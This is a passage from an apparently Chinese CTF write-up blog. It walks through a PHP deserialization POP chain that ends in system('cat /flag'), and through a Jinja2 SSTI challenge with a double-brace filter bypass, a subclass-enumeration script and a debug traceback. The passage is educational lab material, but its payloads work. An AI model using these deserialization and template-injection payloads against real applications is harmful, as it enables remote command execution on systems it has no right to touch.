class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Begin</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Then</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;func = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Super</span>();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Handle</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">CTF</span>();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Super</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Handle</span>();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CTF</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$handle</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;handle = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WhiteGod</span>();<br>    &#125;<br><br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WhiteGod</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&#x27;system&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span> = <span class="hljs-string">&#x27;cat /flag&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Begin</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Then</span>();<br><span class="hljs-variable">$a</span>-&gt;name = <span class="hljs-variable">$b</span>;<br><span class="hljs-keyword">echo</span> (<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-comment">//O:5:&quot;Begin&quot;:1:&#123;s:4:&quot;name&quot;;O:4:&quot;Then&quot;:1:&#123;s:10:&quot;Thenfunc&quot;;O:5:&quot;Super&quot;:1:&#123;s:6:&quot;*obj&quot;;O:6:&quot;Handle&quot;:1:&#123;s:6:&quot;*obj&quot;;O:3:&quot;CTF&quot;:1:&#123;s:6:&quot;handle&quot;;O:8:&quot;WhiteGod&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:9:&quot;cat /flag&quot;;&#125;&#125;&#125;&#125;&#125;&#125;</span><br><br></code></pre></td></tr></table></figure><p>注意：私有变量序列化后不光会在变量名前加上类名，而且还会在类名前后各加一个空白字符<code>%00</code>。<code>protected</code>属性倒不会在变量名前加类名，但他会先加一个<code>*</code>，然后在<code>*</code>之前分别加上<code>%00</code></p><p>所以要修改为：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">O<span class="hljs-punctuation">:</span><span class="hljs-number">5</span><span class="hljs-punctuation">:</span><span class="hljs-attr">&quot;Begin&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">4</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;name&quot;</span>;O<span class="hljs-punctuation">:</span><span class="hljs-number">4</span><span class="hljs-punctuation">:</span><span class="hljs-attr">&quot;Then&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">10</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;%00Then%00func&quot;</span>;O<span class="hljs-punctuation">:</span><span class="hljs-number">5</span><span class="hljs-punctuation">:</span><span class="hljs-attr">&quot;Super&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">6</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;%00*%00obj&quot;</span>;O<span class="hljs-punctuation">:</span><span class="hljs-number">6</span><span class="hljs-punctuation">:</span><span class="hljs-attr">&quot;Handle&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">6</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;%00*%00obj&quot;</span>;O<span class="hljs-punctuation">:</span><span class="hljs-number">3</span><span class="hljs-punctuation">:</span><span class="hljs-attr">&quot;CTF&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">6</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;handle&quot;</span>;O<span class="hljs-punctuation">:</span><span class="hljs-number">8</span><span class="hljs-punctuation">:</span><span class="hljs-attr">&quot;WhiteGod&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">2</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">4</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;func&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">6</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;system&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">3</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;var&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">9</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;cat /flag&quot;</span>;<span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>然后<code>post</code>传<code>pop</code>就行了~</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//其实如果都是public的话可以这样做，可能更好理解一些（不过私有属性只能在定义它们的类内部访问，而不能在类外部或子类中直接访问。）：</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Begin</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Then</span>();<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Super</span>();<br><span class="hljs-variable">$d</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Handle</span>();<br><span class="hljs-variable">$e</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">CTF</span>();<br><span class="hljs-variable">$f</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WhiteGod</span>();<br><span class="hljs-variable">$a</span> -&gt; name = <span class="hljs-variable">$b</span>;<span class="hljs-comment">//类的实例被当字符串，调用tostring函数</span><br><span class="hljs-variable">$b</span> -&gt; func = <span class="hljs-variable">$c</span>;<span class="hljs-comment">//调用函数的方式调用类，触发__invoke函数</span><br><span class="hljs-variable">$c</span> -&gt; obj = <span class="hljs-variable">$d</span>;<span class="hljs-comment">//在对象中调用一个不可访问方法时触发__call函数</span><br><span class="hljs-variable">$d</span> -&gt; obj = <span class="hljs-variable">$e</span>;<span class="hljs-comment">//触发CTF类中的end()函数，调用unset</span><br><span class="hljs-variable">$e</span> -&gt; handle = <span class="hljs-variable">$f</span>;<br></code></pre></td></tr></table></figure><p>理解了上面这个链子的构造方法改一改再放进去就行,其实就是通过类内部提供的公共方法来间接访问私有属性，比如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Example</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$privateProperty</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setPrivateProperty</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;privateProperty = <span class="hljs-variable">$value</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getPrivateProperty</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;privateProperty;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$example</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Example</span>();<br><span class="hljs-variable">$example</span>-&gt;<span class="hljs-title function_ invoke__">setPrivateProperty</span>(<span class="hljs-string">&quot;Hello, World!&quot;</span>); <span class="hljs-comment">// 通过公共方法间接访问私有属性</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$example</span>-&gt;<span class="hljs-title function_ invoke__">getPrivateProperty</span>(); <span class="hljs-comment">// 通过公共方法间接访问私有属性的值</span><br></code></pre></td></tr></table></figure><p>其实这题我看一些人的做法直接<code>urlencode</code>序列化结果就直接传过去了。。但是我的不成功。。不知道为啥:(</p><h2 id="GenShin"><a href="#GenShin" class="headerlink" title="GenShin"></a>GenShin</h2><p><img src="/img/genshin1.png" alt="genshin1"></p><p><code>dirsearch</code>没扫出来啥，<code>bp</code>抓包发现这么个东西：</p><p><img src="/img/genshin4.png" alt="genshin4"></p><p><code>secr3tofpop</code>，访问就行</p><p><img src="/img/genshin2.png" alt="genshin2"></p><p><code>node4.buuoj.cn:81/secr3tofpop?name=1</code></p><p><img src="/img/genshin3.png" alt="genshin3"></p><p><code>name</code>的值会回显到页面上，猜测<code>SSTI</code>，先判断类型：</p><p><code>/secr3tofpop?name=$&#123;7*7&#125;</code>：</p><p><img src="/img/genshin5.png" alt="genshin5"></p><p><code>/secr3tofpop?name=&#123;&#123;7*7&#125;&#125;</code></p><p><img src="/img/genshin6.png" alt="genshin6"></p><p>经过测试单个<code>&#123;&#125;</code>没被过滤，但<code>&#123;&#123;&#125;&#125;</code>会被检测到。而且引号<code>&#39;&#39;</code>也被过滤了。</p><p>引号过滤我们可以使用数组<code>[]</code>或者直接<code>config</code>找他的爹，至于双括号被过滤，网上找了篇文章：</p><p><code>https://blog.csdn.net/weixin_73051164/article/details/132574970</code></p><p><code>?name=&#123;%%20print([].__class__.__base__.__subclasses__())%20%&#125;</code>:</p><p><code>/secr3tofpop?name=%7b%%20print([].__class__.__base__.__subclasses__())%20%%7D</code></p><p><img src="/img/genshin7.png" alt="genshin7"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">100</span>):<br>    time.sleep(<span class="hljs-number">0.04</span>)<br>    url = <span class="hljs-string">&quot;http://3ae9f2a4-38eb-4d14-9b46-74045fd576fb.node4.buuoj.cn:81/secr3tofpop?name=&#123;%%20print([].__class__.__base__.__subclasses__()[&quot;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&quot;])%20%&#125;&quot;</span>  <br><br>    s = requests.get(url=url)<br>    time.sleep(<span class="hljs-number">0.06</span>)<br>    <span class="hljs-comment">#print(s.text)</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;os&#x27;</span> <span class="hljs-keyword">in</span> s.text:<br>        <span class="hljs-built_in">print</span>(i)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">continue</span><br></code></pre></td></tr></table></figure><p>这段代码运行的时候会出问题，比如：</p><p><img src="/img/genshin8.png" alt="genshin8"></p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;frame&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;frame-139696630025344&quot;</span>&gt;</span></span><br><span class="language-xml">  </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h4</span>&gt;</span>File </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">cite</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;filename&quot;</span>&gt;</span>&quot;<span class="hljs-symbol">&amp;lt;</span>unknown<span class="hljs-symbol">&amp;gt;</span>&quot;<span class="hljs-tag">&lt;/<span class="hljs-name">cite</span>&gt;</span></span><span class="language-xml">,</span><br><span class="language-xml">      line </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">em</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;line&quot;</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span></span><span class="language-xml">,</span><br><span class="language-xml">      in </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">code</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;function&quot;</span>&gt;</span>template<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">  </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;source &quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span><br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">blockquote</span>&gt;</span>jinja2.exceptions.TemplateSyntaxError: tag name expected</span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">blockquote</span>&gt;</span></span><br>&lt;/div&gt;<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;plain&quot;</span>&gt;</span></span><br><span class="language-xml">    </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml">      This is the Copy/Paste friendly version of the traceback.</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">textarea</span> <span class="hljs-attr">cols</span>=<span class="hljs-string">&quot;50&quot;</span> <span class="hljs-attr">rows</span>=<span class="hljs-string">&quot;10&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;code&quot;</span> <span class="hljs-attr">readonly</span>&gt;</span>Traceback (most recent call last):</span><br><span class="language-xml">  File <span class="hljs-symbol">&amp;#34;</span>/usr/local/lib/python3.8/site-packages/flask/app.py<span class="hljs-symbol">&amp;#34;</span>, line 2213, in __call__</span><br><span class="language-xml">    return self.wsgi_app(environ, start_response)</span><br><span class="language-xml">  File <span class="hljs-symbol">&amp;#34;</span>/usr/local/lib/python3.8/site-packages/flask/app.py<span class="hljs-symbol">&amp;#34;</span>, line 2193, in wsgi_app</span><br><span class="language-xml">    response = self.handle_exception(e)</span><br><span class="language-xml">  File <span class="hljs-symbol">&amp;#34;</span>/usr/local/lib/python3.8/site-packages/flask/app.py<span class="hljs-symbol">&amp;#34;</span>, line 2190, in wsgi_app</span><br><span class="language-xml">    response = self.full_dispatch_request()</span><br><span class="language-xml">  File <span class="hljs-symbol">&amp;#34;</span>/usr/local/lib/python3.8/site-packages/flask/app.py<span class="hljs-symbol">&amp;#34;</span>, line 1486, in full_dispatch_request</span><br><span class="language-xml">    rv = self.handle_user_exception(e)</span><br><span class="language-xml">  File <span class="hljs-symbol">&amp;#34;</span>/usr/local/lib/python3.8/site-packages/flask/app.py<span class="hljs-symbol">&amp;#34;</span>, line 1484, in full_dispatch_request</span><br><span class="language-xml">    rv = self.dispatch_request()</span><br><span class="language-xml">  File <span class="hljs-symbol">&amp;#34;</span>/usr/local/lib/python3.8/site-packages/flask/app.py<span class="hljs-symbol">&amp;#34;</span>, line 1469, in dispatch_request</span><br><span class="language-xml">    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)</span><br><span class="language-xml">  File <span class="hljs-symbol">&amp;#34;</span>/app/app.py<span class="hljs-symbol">&amp;#34;</span>, line 21, in hello</span><br><span class="language-xml">    return render_template_string(sign_in)</span><br><span class="language-xml">  File <span class="hljs-symbol">&amp;#34;</span>/usr/local/lib/python3.8/site-packages/flask/templating.py<span class="hljs-symbol">&amp;#34;</span>, line 162, in render_template_string</span><br><span class="language-xml">    template = app.jinja_env.from_string(source)</span><br><span class="language-xml">  File <span class="hljs-symbol">&amp;#34;</span>/usr/local/lib/python3.8/site-packages/jinja2/environment.py<span class="hljs-symbol">&amp;#34;</span>, line 1105, in from_string</span><br><span class="language-xml">    return cls.from_code(self, self.compile(source), gs, None)</span><br><span class="language-xml">  File <span class="hljs-symbol">&amp;#34;</span>/usr/local/lib/python3.8/site-packages/jinja2/environment.py<span class="hljs-symbol">&amp;#34;</span>, line 768, in compile</span><br><span class="language-xml">    self.handle_exception(source=source_hint)</span><br><span class="language-xml">  File <span class="hljs-symbol">&amp;#34;</span>/usr/local/lib/python3.8/site-packages/jinja2/environment.py<span class="hljs-symbol">&amp;#34;</span>, line 936, in handle_exception</span><br><span class="language-xml">    raise rewrite_traceback_stack(source=source)</span><br><span class="language-xml">  File <span class="hljs-symbol">&amp;#34;</span><span class="hljs-symbol">&amp;lt;</span>unknown<span class="hljs-symbol">&amp;gt;</span><span class="hljs-symbol">&amp;#34;</span>, line 2, in template</span><br><span class="language-xml">jinja2.exceptions.TemplateSyntaxError: tag name expected</span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span></span><br>&lt;/div&gt;<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;explanation&quot;</span>&gt;</span></span><br><span class="language-xml">  The debugger caught an exception in your WSGI application.  You can now</span><br><span class="language-xml">  look at the traceback which led to the error.  </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nojavascript&quot;</span>&gt;</span></span><br><span class="language-xml">  If you enable JavaScript you can also use additional features such as code</span><br><span class="language-xml">  execution (if the evalex feature is enabled), automatic pasting of the</span><br><span class="language-xml">  exceptions and much more.<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>      <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;footer&quot;</span>&gt;</span></span><br><span class="language-xml">        Brought to you by </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">strong</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;arthur&quot;</span>&gt;</span>DON&#x27;T PANIC<span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span></span><span class="language-xml">, your</span><br><span class="language-xml">        friendly Werkzeug powered traceback interpreter.</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>    &lt;/div&gt;<br><br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;pin-prompt&quot;</span>&gt;</span></span><br><span class="language-xml">      </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;inner&quot;</span>&gt;</span></span><br><span class="language-xml">        </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>Console Locked<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">        </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml">          The console is locked and needs to be unlocked by entering the PIN.</span><br><span class="language-xml">          You can find the PIN printed out on the standard output of your</span><br><span class="language-xml">          shell that runs the server.</span><br><span class="language-xml">        </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span></span><br><span class="language-xml">          </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>PIN:</span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">text</span> <span class="hljs-attr">name</span>=<span class="hljs-string">pin</span> <span class="hljs-attr">size</span>=<span class="hljs-string">14</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">name</span>=<span class="hljs-string">btn</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Confirm Pin&quot;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br><br>&lt;!--<br><br>Traceback (most recent call<span class="hljs-built_in"> last</span>):<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;</span>, line <span class="hljs-number">2213</span>, <span class="hljs-keyword">in</span> __call_<span class="hljs-number">_</span><br>    <span class="hljs-keyword">return</span> self.wsgi_app(environ, start_response)<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;</span>, line <span class="hljs-number">2193</span>, <span class="hljs-keyword">in</span> wsgi_app<br>    response = self.handle_exception(e)<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;</span>, line <span class="hljs-number">2190</span>, <span class="hljs-keyword">in</span> wsgi_app<br>    response = self.full_dispatch_request()<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;</span>, line <span class="hljs-number">1486</span>, <span class="hljs-keyword">in</span> full_dispatch_request<br>    rv = self.handle_user_exception(e)<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;</span>, line <span class="hljs-number">1484</span>, <span class="hljs-keyword">in</span> full_dispatch_request<br>    rv = self.dispatch_request()<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;</span>, line <span class="hljs-number">1469</span>, <span class="hljs-keyword">in</span> dispatch_request<br>    <span class="hljs-keyword">return</span> self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)<br>  File <span class="hljs-string">&quot;/app/app.py&quot;</span>, line <span class="hljs-number">21</span>, <span class="hljs-keyword">in</span> hello<br>    <span class="hljs-keyword">return</span> render_template_string(sign_in)<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.8/site-packages/flask/templating.py&quot;</span>, line <span class="hljs-number">162</span>, <span class="hljs-keyword">in</span> render_template_string<br>    template = app.jinja_env.from_string(source)<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.8/site-packages/jinja2/environment.py&quot;</span>, line <span class="hljs-number">1105</span>, <span class="hljs-keyword">in</span> from_string<br>    <span class="hljs-keyword">return</span> cls.from_code(self, self.compile(source), gs, None)<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.8/site-packages/jinja2/environment.py&quot;</span>, line <span class="hljs-number">768</span>, <span class="hljs-keyword">in</span> compile<br>    self.handle_exception(source=source_hint)<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.8/site-packages/jinja2/environment.py&quot;</span>, line <span class="hljs-number">936</span>, <span class="hljs-keyword">in</span> handle_exception<br>    raise rewrite_traceback_stack(source=source)<br>  File <span class="hljs-string">&quot;&lt;unknown&gt;&quot;</span>, line <span class="hljs-number">2</span>, <span class="hljs-keyword">in</span> template<br>jinja2.exceptions.TemplateSyntaxError: tag<span class="hljs-built_in"> name</span> 